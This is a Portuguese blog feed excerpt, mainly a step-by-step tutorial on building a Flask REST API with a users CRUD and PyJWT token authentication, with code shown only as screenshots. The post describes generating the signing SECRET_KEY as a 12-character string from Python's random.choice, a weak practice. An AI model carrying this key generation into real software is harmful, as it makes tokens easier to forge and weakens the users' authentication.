  <li><a href="https://github.com/h41stur/kali_container">KALI CONTAINER</a></li>
</ul>

<p>Espero que tenha ajudado de alguma forma!</p>

<p>HACK THE PLANET!!</p>]]></content><author><name>Hastur</name></author><category term="Ferramentas" /><category term="Tutoriais" /><category term="Docker" /><category term="Container" /><category term="Tutorial" /><category term="Tool" /><summary type="html"><![CDATA[Neste artigo, vamos entender o processo que permite que executemos aplicações que utilizam GUI de dentro de um container.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/img/posts/gui_docker.jpg" /><media:content medium="image" url="http://localhost:4000/img/posts/gui_docker.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Criando uma Flask API REST com autenticação JWE</title><link href="http://localhost:4000/ferramentas/tutoriais/2022/02/08/api-rest.html" rel="alternate" type="text/html" title="Criando uma Flask API REST com autenticação JWE" /><published>2022-02-08T01:00:00-03:00</published><updated>2022-02-08T01:00:00-03:00</updated><id>http://localhost:4000/ferramentas/tutoriais/2022/02/08/api-rest</id><content type="html" xml:base="http://localhost:4000/ferramentas/tutoriais/2022/02/08/api-rest.html"><![CDATA[<p>Esta API, faz parte do curso de Python ministrado por mim no <strong>Hacker Space</strong> <a href="https://becodoexploit.com">Beco do exploit</a>.</p>

<p>O intuito de desenvolver uma API, faz parte do <code class="language-plaintext highlighter-rouge">mindset</code> de que “se você sabe construir, também sabe desconstruir”. Além de que, o conhecimento do desenvolvimento de APIs, soma com a habilidade de construir ferramentas para o dia-a-dia de uma exploração.</p>

<p>A idéia não é despejar todo o código pronto, mas mostrar passo a passo como é a linha de pensamento ao criar uma API, ao final, deixarei o projeto disponível no <code class="language-plaintext highlighter-rouge">Github</code>.</p>

<h1 id="o-que-você-vai-precisar">O que você vai precisar:</h1>

<ul>
  <li>Conhecer um pouco de métodos <a href="https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Methods">HTTP</a>;</li>
  <li>Conhecer banco de dados;</li>
  <li>Conhecer o basico de Python;</li>
  <li>Algum editor de código fonte de sua preferência (vou usar o VSCode);</li>
  <li>Alguma plataforma para testar a API de sua preferência (vou usar o Postman).</li>
</ul>

<h2 id="iniciando-o-projeto">Iniciando o projeto</h2>

<p>A princípio, precisamos criar nosso projeto em algum diretório, pois, para fins de organização do código, vamos montar toda a estrutura de diretórios que irá conter nossas bibliotecas e arquivos.</p>

<center><img src="/img/posts/api-01.png" /></center>

<p>Dentro do diretório do projeto, vamos criar uma pasta chamada <code class="language-plaintext highlighter-rouge">api</code>, pois é onde trabalharemos os códigos. Dentro da pasta api, vamos criar a pasta <code class="language-plaintext highlighter-rouge">app</code>.</p>

<center><img src="/img/posts/api-02.png" /></center>

<h2 id="codando">Codando</h2>

<p>Com a estrutura inicial pronta, vamos começar a codar. Algumas pessoas costumam criar uma <code class="language-plaintext highlighter-rouge">venv</code> para instalar pacotes, a fim de não “sujar” a instalação principal do python, no meu caso vou carregar a biblioteca na instalação principal com o comando <code class="language-plaintext highlighter-rouge">pip install flask</code> (porém, desde já recomendo fortemente utilizar um ambiente virtual).</p>

<p>Após instalado, vamos criar um arquivo chamado <code class="language-plaintext highlighter-rouge">__init__.py</code> dentro do diretório <code class="language-plaintext highlighter-rouge">app</code>. Este arquivo vai conter nossa instancia inicial da API.</p>

<center><img src="/img/posts/api-03.png" /></center>

<p>Somente com este script, é possível iniciar nosso servidor da API, porém, como vamos fazer um projeto <code class="language-plaintext highlighter-rouge">organizado</code> e de simples manutenção, vamos criar um script chamado <code class="language-plaintext highlighter-rouge">run.py</code> dentro do diretório <code class="language-plaintext highlighter-rouge">api</code>, que é a raiz do nosso projeto.</p>

<p>Este script irá conter as variáveis para iniciarmos o servidor.</p>

<center><img src="/img/posts/api-04.png" /></center>

<p>Note que colocamos as variáveis de inicialização dentro do arquivo <code class="language-plaintext highlighter-rouge">run.py</code>, logo, ela deve ser retirada do script <code class="language-plaintext highlighter-rouge">__init__.py</code>.</p>

<p>Ainda no diretório raiz, vamos criar o arquivo <code class="language-plaintext highlighter-rouge">config.py</code> que irá conter todas as nossas configurações da API, a princípio, este arquivo deve conter somente a linha <code class="language-plaintext highlighter-rouge">DEBUG = True</code> isso permitirá que o servidor reconheça as alterações realizadas e reinicie automaticamente a cada alteração no código que fizermos.</p>

<p>Agora precisamos voltar ao nosso arquivo <code class="language-plaintext highlighter-rouge">__init__.py</code> e passar as configurações, ficando desta forma:</p>

<center><img src="/img/posts/api-05.png" /></center>

<p>Com estas atualizações, nossa API irá carregar todas as nossas configurações deste arquivo.</p>

<h2 id="criando-rotas">Criando rotas</h2>

<p>Nossa API precisa de rotas para carregar, atualizar, e alterar os dados, pra isso precisamos criar rotas. O microframework Flask, nos permite criar rotas de forma muito fácil.</p>

<p>Para isso, vamos criar um diretório dentro da pasta <code class="language-plaintext highlighter-rouge">app</code> chamado <code class="language-plaintext highlighter-rouge">routes</code>, e dentro dele criar o arquivo <code class="language-plaintext highlighter-rouge">routes.py</code> que ficará desta forma:</p>

<center><img src="/img/posts/api-06.png" /></center>

<p>Agora precisamos importar as rotas em nosso arquivo <code class="language-plaintext highlighter-rouge">__init__.py</code> desta forma:</p>

<center><img src="/img/posts/api-07.png" /></center>

<p>Agora, podemos executar nosso script <code class="language-plaintext highlighter-rouge">run.py</code>, ele vai iniciar o servidor no localhost na porta 5000 (esta porta também pode ser alterada).</p>

<p>Precisamos de uma plataforma para testar a API, no meu caso vou utilizar o <code class="language-plaintext highlighter-rouge">Postman</code>. Ao fazer uma requisição via <code class="language-plaintext highlighter-rouge">GET</code> no endereço <code class="language-plaintext highlighter-rouge">http://127.0.0.1:5000</code> temos o retorno da API com nosso <code class="language-plaintext highlighter-rouge">Hello World!</code>.</p>

<center><img src="/img/posts/api-08.png" /></center>

<h2 id="conexão-com-banco-de-dados">Conexão com banco de dados</h2>

<p>A conexão com banco de dados pode ser feito com qualquer <code class="language-plaintext highlighter-rouge">SGBD</code>, nesta API do tutorial vou utilizar <code class="language-plaintext highlighter-rouge">sqlite3</code>, porém vou deixar uma configuração comentada caso queira utilizar <code class="language-plaintext highlighter-rouge">MySQL</code>.</p>

<p>Para dar continuidade, algumas bibliotecas precisam ser instaladas, são elas:</p>

<ul>
  <li>flask_marshmallow;</li>
  <li>marshmallow_sqlalchemy;</li>
  <li>marshmallow;</li>
  <li>Flask-SQLAlchemy;</li>
  <li>mysqlclient;</li>
</ul>

<p>Todas elas podem ser instaladas com <code class="language-plaintext highlighter-rouge">pip</code>.</p>

<p>Agora precisamos atualizar nosso <code class="language-plaintext highlighter-rouge">config.py</code> com as variáveis de conexão, ficando desta forma:</p>

<center><img src="/img/posts/api-09.png" /></center>

<p>Agora precisamos atualizar nosso <code class="language-plaintext highlighter-rouge">__init__.py</code> criando uma instância do SQLAlchemy que fará todas as iterações com o banco de dados e uma instância Marshmallow que facilitará nossa vida convertendo consultas no banco de dados no formato <code class="language-plaintext highlighter-rouge">JSON</code>. Ficando desta forma:</p>

<center><img src="/img/posts/api-10.png" /></center>

<p>Neste momento, podemos ver nossa API tomando forma.</p>

<h2 id="criando-o-model">Criando o model</h2>

<p>Neste momento, vamos criar nosso primeiro <code class="language-plaintext highlighter-rouge">model</code> que será de usuários, para isto, vamos criar um diretório chamado <code class="language-plaintext highlighter-rouge">models</code> dentro do diretório <code class="language-plaintext highlighter-rouge">app</code> e dentro dele o arquivo <code class="language-plaintext highlighter-rouge">users.py</code>.</p>

<p>Dentro deste arquivo, precisamos importar as instâncias do SQLAlchemy e Marshmallow que criamos em nosso <code class="language-plaintext highlighter-rouge">__init__.py</code>. Após isto, podemos criar uma classe que irá conter nossas configurações do database, ficando desta forma:</p>

<center><img src="/img/posts/api-11.png" /></center>

<blockquote>
  <p>Conforme observado, criamos a instância no “__init__.py” com a variável “db” contendo o SQLAlchemy. Com ela podemos configurar o database de forma muito fácil com Flask passando argumentos para as configurar as colunas da tabela.</p>
</blockquote>

<p>Com o model criado, podemos utilizar o Marshmallow para serializar nossas consultas e facilitar o retorno no formato <code class="language-plaintext highlighter-rouge">JSON</code>. Dentro do meusmo arquivo <code class="language-plaintext highlighter-rouge">users.py</code>, podemos adicionar a seguinte classe:</p>

<center><img src="/img/posts/api-12.png" /></center>

<blockquote>
  <p>Por padrão os schemas do Marshmallow não precisam de uma base com uma classe, porém como estamos utilizando o SQLAlchemy, precisamos utilizar a class Meta, que vai utilizar os campos da classe criada anteriormente. Também criamos duas variáveis que serão utilizadas para retornar o JSON, sendo que o parâmetro many, informa que será retornado uma array.</p>
</blockquote>

<p>Com nosso <code class="language-plaintext highlighter-rouge">users.py</code> criado, precisamos referenciá-lo em nosso arquivo <code class="language-plaintext highlighter-rouge">__init__.py</code> desta forma:</p>

<center><img src="/img/posts/api-13.png" /></center>

<p>Com o model criado, precisamos navegar com o <code class="language-plaintext highlighter-rouge">SHELL</code> (<code class="language-plaintext highlighter-rouge">CMD</code> se você estiver no Windows) até o diretório <code class="language-plaintext highlighter-rouge">api</code> que é a raiz do nosso projeto e rodar os seguintes comandos:</p>

<center><img src="/img/posts/api-14.png" /></center>

<p>Como estou utilizando <code class="language-plaintext highlighter-rouge">sqlite3</code>, já é possível ver o database criado nos diretórios do projeto.</p>

<center><img src="/img/posts/api-15.png" /></center>

<p>Caso estaja utilizando <code class="language-plaintext highlighter-rouge">MySQL</code>, verá que a tabela de usuários foi criada.</p>

<h2 id="operações-de-crud">Operações de CRUD</h2>

<p>Neste ponto nossa API já tem vários diretórios e pode parecer um emaranhado de scripts, porém as coisas farão um pouco mais de sentido agora, montando nosso primeiro <code class="language-plaintext highlighter-rouge">CRUD</code>.</p>

<p>Antes de mais nada, vamos criar uma pasta <code class="language-plaintext highlighter-rouge">views</code> dentro da pasta <code class="language-plaintext highlighter-rouge">app</code> para montarmos toda a lógica e conexão com o banco de dados. Dentro desta pasta, vamos criar um novo arquivo <code class="language-plaintext highlighter-rouge">users.py</code> (sim, temos dois scripts com o mesmo nome, porém em diretórios diferentes) para realizar as operações.</p>

<p>Neste script, precisamos importar o banco de dados do nosso app, nosso model e algumas funçõs da biblioteca Flask. As ferramentas devem ficar parecido com isso:</p>

<center><img src="/img/posts/api-16.png" /></center>

<p>A primeira função que criaremos em nosso CRUD, será a de adicionar um usuário, como estamos trabalhando com requisições no formato JSON, vamos utilizar o objeto <code class="language-plaintext highlighter-rouge">request</code> que importamos da biblioteca <code class="language-plaintext highlighter-rouge">flask</code>, este objeto possui vários atributos que podem ser aprendidos através da própria biblioteca do <a href="https://flask.palletsprojects.com/en/2.0.x/quickstart/">Flask</a>. A função fica desta forma:</p>

<center><img src="/img/posts/api-17.png" /></center>
<blockquote>
  <p>Note que utilizamos a biblioteca “werkzeug.security” para criar uma hash com a senha do usuário, pois em situação nenhuma devemos gravar senhas em texto claro em banco de dados. Em seguida, criamos um objeto “user” que contém todas as variáveis que criamos.</p>
</blockquote>

<p>Agora precisamos inserir as informações recebidas no banco de dados, para organizar bem a API, vamos inserir numa estrutura <em>try/except</em> para que a API retorne uma mensagem diferente caso ocorra algum erro no insert. Vamos utilizar a variável <code class="language-plaintext highlighter-rouge">db</code> que importamos do app. Ficando desta forma:</p>

<center><img src="/img/posts/api-18.png" /></center>

<p>Nesta função, utilizamos uma sessão do nosso banco de dados para registrar um usuário e logo em seguida retornamos estes dados no formato JSON. Para isto utilizamos nosso objeto <code class="language-plaintext highlighter-rouge">user_schema</code> que utiliza o Marshmallow que transforma nossa Instância de Users em JSON.</p>

<p>Para que este script esteja disponível em nossa API, precisamos criar uma rota para ela, portanto precisamos incluí-la em nosso <code class="language-plaintext highlighter-rouge">routes.py</code> utilizando o método <code class="language-plaintext highlighter-rouge">POST</code>. A nova rota fica desta maneira:</p>

<center><img src="/img/posts/api-19.png" /></center>

<p>Com o script atualizado, podemos criar uma requisição via <code class="language-plaintext highlighter-rouge">POST</code>com o Postman para testar o CRUD. A requisição deve conter os dados no formato JSON conforme abaixo:</p>

<center><img src="/img/posts/api-20.png" /></center>

<p>Ao enviar a requisição <code class="language-plaintext highlighter-rouge">POST</code> temos a resposta:</p>

<center><img src="/img/posts/api-21.png" /></center>

<p>E nossa primeira função do CRUD funcionou com sucesso!!!</p>

<p>Agora podemos seguir com o upgrade de nossa API com uma função que atualizará os dados do usuário. Para issom, vamos continuar editando o script <code class="language-plaintext highlighter-rouge">users.py</code> na pasta <code class="language-plaintext highlighter-rouge">views</code> acicionando uma nova função conforme abaixo:</p>

<center><img src="/img/posts/api-22.png" /></center>

<blockquote>
  <p>Aqui criamos um objeto “user” que recebe o parâmetro “id”, pois a requisição receberá o id do usuário e consultará no banco de dados. Caso este usuário exista, as informações passadas na requisição serão atualizadas em banco, mas caso não exista o id informado, uma mensagem deve ser passada ao usuário.</p>
</blockquote>

<p>Agora precisamos criar uma rota para este update de usuários em um novo <code class="language-plaintext highlighter-rouge">endpoint</code> lá em nosso script <code class="language-plaintext highlighter-rouge">routes.py</code> desta forma:</p>

<center><img src="/img/posts/api-23.png" /></center>
<blockquote>
  <p>Note que após o endpoint “/users” existe o parâmetro “/<id>". Isso significa que a API vai capturar o que vier após o /users/ como um parâmetro e usá-lo na função.</id></p>
</blockquote>

<p>Agora podemos testá-lo no Postman alterando os dados do primeiro usuário que criamos:</p>

<center><img src="/img/posts/api-24.png" /></center>

<p>E temos o retorno da requisição com os dados de email alterados:</p>

<center><img src="/img/posts/api-25.png" /></center>

<p>Agora vamos criar uma função para listar todos os usuários cadastrados em banco, ficando desta forma:</p>

<center><img src="/img/posts/api-26.png" /></center>
<blockquote>
  <p>Note que para chamar um usuário pelo id, foi utilizada a função “Users.query.get(id)” , pois o .get() procura por um campo, já para listar tosos os usuários, utilizamos “Users.query.all()”, pos o .all() captura toda a tabela.</p>
</blockquote>

<p>Agora precisamos adicionar uma rota para esta consulta, desta forma:</p>

<center><img src="/img/posts/api-27.png" /></center>

<p>Antes de testar a requisição, adicionei mais 2 usuários para o resultado ficar melhor. Ao requisitar esta rota, temos a seguinte resposta:</p>

<center><img src="/img/posts/api-28.png" /></center>

<p>Tudo irganizado e respondendo como esperado!</p>

<p>Agora que listamos <code class="language-plaintext highlighter-rouge">todos</code> os usuários, vamos montar uma função que retorna somente um usuário através do <code class="language-plaintext highlighter-rouge">id</code>. Para isto vamos criar mais uma função em nosso <code class="language-plaintext highlighter-rouge">users.py</code> desta forma:</p>

<center><img src="/img/posts/api-29.png" /></center>

<p>E como já fizemos com outras funções, vamos adicionar uma rota:</p>

<center><img src="/img/posts/api-30.png" /></center>

<p>E vamos testá-lo:</p>

<center><img src="/img/posts/api-31.png" /></center>

<p>Com isso nosso CRUD está quase pronto, faltando somente uma função para remover um usuário, para isso, vamos utilizar o método HTTP <code class="language-plaintext highlighter-rouge">DELETE</code>.</p>

<p>Esta função será bem parecida com a função update, porém vamos utilizar o <code class="language-plaintext highlighter-rouge">delete</code>, desta forma:</p>

<center><img src="/img/posts/api-32.png" /></center>

<p>E como de costume, vamos criar a seguinte rota:</p>

<center><img src="/img/posts/api-33.png" /></center>

<p>Agora podemos testar no Postman, deletando um dos usuários:</p>

<center><img src="/img/posts/api-34.png" /></center>

<p>E isso finaliza todo o CRUD de usuários da nossa API. O próximo passo é fazer a autenticação via token.</p>

<h1 id="json-tokens">JSON Tokens</h1>

<p>Até o momento, nossa API já tem um método de autenticação, porém todos os métodos estão liberados, precisamos fornecer um modelo de segurança no qual somente um usuário autenticado na API consiga efetuar consultas e alterações.</p>

<p>Para isso, vamos utilizar a biblioteca <code class="language-plaintext highlighter-rouge">PyJWT</code> que pode ser instalada com o comando <code class="language-plaintext highlighter-rouge">pip install PyJWT</code> e sua documentação pode ser encontrada <a href="https://pyjwt.readthedocs.io/en/stable/">aqui</a>.</p>

<p>O token vai consistir numa hash criptografada contendo o username e uma <code class="language-plaintext highlighter-rouge">chave secreta</code> randômica gerada pela API.</p>

<p>A primeira parte, é criar essa chave secreta, vamos para nosso arquivo <code class="language-plaintext highlighter-rouge">config.py</code> para gerar esta hash, o arquivo ficará desta forma:</p>

<center><img src="/img/posts/api-35.png" /></center>
<blockquote>
  <p>Note que a variável chave_randomica recebe vários atributos da biblioteca string que ainda não recebe nenhum valor, mas quando juntamos esta variável com a função choice da biblioteca random, temos uma sequência totalmente aleatória através de um loop de 12, que será o tamanho da string gerada.</p>
</blockquote>

<p>Agora podemos criar uma função em nosso arquivo <code class="language-plaintext highlighter-rouge">users.py</code> que vai nos ajudar a fazer uma query no banco através do username, a função fica desta forma:</p>

<center><img src="/img/posts/api-36.png" /></center>

<p>Agora podemos criar um novo script dentro da pasta <code class="language-plaintext highlighter-rouge">views</code> que fará a autenticação, vamos chamá-lo de <code class="language-plaintext highlighter-rouge">authenticator.py</code>. Nele vamos importar o nosso <code class="language-plaintext highlighter-rouge">jwt</code>, e mais algumas bibliotecas para criarmos <a href="https://www.datacamp.com/community/tutorials/decorators-python?utm_source=adwords_ppc&amp;utm_medium=cpc&amp;utm_campaignid=14989519638&amp;utm_adgroupid=127836677279&amp;utm_device=c&amp;utm_keyword=&amp;utm_matchtype=b&amp;utm_network=g&amp;utm_adpostion=&amp;utm_creative=332602034364&amp;utm_targetid=aud-299261629574:dsa-429603003980&amp;utm_loc_interest_ms=&amp;utm_loc_physical_ms=1001772&amp;gclid=Cj0KCQiAsqOMBhDFARIsAFBTN3cEH3fQEs4VV3T6w1NbHOhVkNHsKuAzQCSMyjU-psZ3f4EvAhkI0-oaAjbOEALw_wcB">decorators</a> que seráo utilizados em nosso script. A princípio, as importações ficam desta forma:</p>

<center><img src="/img/posts/api-37.png" /></center>

<p>Vamos começar criando a função <code class="language-plaintext highlighter-rouge">auth</code> que será utilizada para autenticar o usuário e gerar o token criptografado, nesta função, iremos criar uma variável que receberá o header com <code class="language-plaintext highlighter-rouge">basic authorization</code>, desta forma:</p>

<center><img src="/img/posts/api-38.png" /></center>

<p>Neste ponto, já fizemos uma validação básico do usuário, mas ainda é preciso validar o usuário no banco de dados.</p>

<p>Para isto, vamos utilizar a ultima funcã́o que criamos no arquivo <code class="language-plaintext highlighter-rouge">users.py</code>, desta forma:</p>

<center><img src="/img/posts/api-39.png" /></center>

<p>Até o momento, já validamos se o usuário existe no banco, mas também é preciso validar se a senha está correta, porém, a senha gravada em banco está criptografada, para comparar a senha informada com a que está gravada em banco, é preciso criptografar o que vem no request para fazer a comparação e gerar o token se tudo estiver ok. Uma vez que tudo foi validado, podemos gerar o token criptografado com um tempo de expiração, sendo a chave de criptografia, nossa <code class="language-plaintext highlighter-rouge">SECRET_KEY</code>. O script fica desta forma:</p>

<center><img src="/img/posts/api-40.png" /></center>

<p>Agora é preciso criar um endpoint para autenticação, vamos criar a rota em nosso <code class="language-plaintext highlighter-rouge">routes.py</code>:</p>

<center><img src="/img/posts/api-41.png" /></center>
<blockquote>
  <p>Não se esqueça de importar o arquivo authenticator no routes.py</p>
</blockquote>

<p>Agora precisamos testar, para isso, vamos fazer a requisição <code class="language-plaintext highlighter-rouge">POST</code> para o endpoint, passando as credenciais no <code class="language-plaintext highlighter-rouge">Basic authorization</code> do Postman, se os dados de usuário e senha foram passados corretamente, esta é a resposta:</p>

<center><img src="/img/posts/api-42.png" /></center>

<p>Caso uma senha, ou usuário inválidos foram passados, teremos esta resposta:</p>

<center><img src="/img/posts/api-43.png" /></center>

<p>Neste momento, está quase tudo pronto, porém, precisamos fazer com que nossos endpoints entendam que uma autenticação é necessária para que possam operar. Para isso vamos criar a função <code class="language-plaintext highlighter-rouge">token_required</code> que utilizará <a href="https://docs.python.org/pt-br/3/library/functools.html">wraps</a> da biblioteca <code class="language-plaintext highlighter-rouge">functools</code>que importamos. Ficando inicialmente assim:</p>

<center><img src="/img/posts/api-44.png" /></center>

<p>Com isso, validamos se um token foi enviado no request, mas ainda precisamos validar se este token é valido. Para isso, nossa API precisa decodificar este token e verificar se a <code class="language-plaintext highlighter-rouge">SECRET_KEY</code> é valida. Uma vez que o token foi validado vamos criar uma variável que fará uma pesquisa no banco de dados a partir da função <code class="language-plaintext highlighter-rouge">user_by_userneme</code> que criamos no arquivo <code class="language-plaintext highlighter-rouge">users.py</code> da pasta <code class="language-plaintext highlighter-rouge">views</code> e iremos retornar este usuário nos argumentos do <code class="language-plaintext highlighter-rouge">decorator</code>. Ficando desta forma:</p>

<center><img src="/img/posts/api-45.png" /></center>

<p>Com a função pronta, precisamos atualizar nossa rota para exigir o token, vamos testar com a primeira rota que criamos utilizando o <code class="language-plaintext highlighter-rouge">decorator</code> desta forma:</p>

<center><img src="/img/posts/api-46.png" /></center>

<p>Agora é a hora da verdade onde testaremos nossa autenticação, primeiro vamos fazer uma requisição sem nenhum token:</p>

<center><img src="/img/posts/api-47.png" /></center>

<p>Ótimo, a API já identificou que é necessário um token para operar. Agora vamos fazer uma requisição com um token inválido:</p>

<center><img src="/img/posts/api-48.png" /></center>

<p>Excelente, a API já reconheceu que o token é inválido. Agora vamos gerar um token no endpoint <code class="language-plaintext highlighter-rouge">/auth</code> e passar este token na requisição:</p>

<center><img src="/img/posts/api-49.png" /></center>

<p>E a API funcionou perfeitamente!!! Agora podemos passar o <code class="language-plaintext highlighter-rouge">decorator</code> em qualquer endpoint que desejarmos.</p>

<p>Isso finaliza toda a construção da API com autenticação. A partir daí, mais funcionalidades e consultas ao banco de dados podem ser efetuadas para dar sentido à API.</p>

<p>Conforme prometido, o projeto completo está disponível no <a href="https://github.com/h41stur/beco.py">GitHub</a>.</p>

<p>Espero que o artigo e a ferramenta tenham sido úteis para os seus estudos, até a próxima!!!</p>]]></content><author><name>Hastur</name></author><category term="Ferramentas" /><category term="Tutoriais" /><category term="Flask" /><category term="API REST" /><category term="Python" /><category term="Beco do Exploit" /><summary type="html"><![CDATA[Esta API, faz parte do curso de Python ministrado por mim no Hacker Space Beco do exploit.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/img/posts/api-logo.jpeg" /><media:content medium="image" url="http://localhost:4000/img/posts/api-logo.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>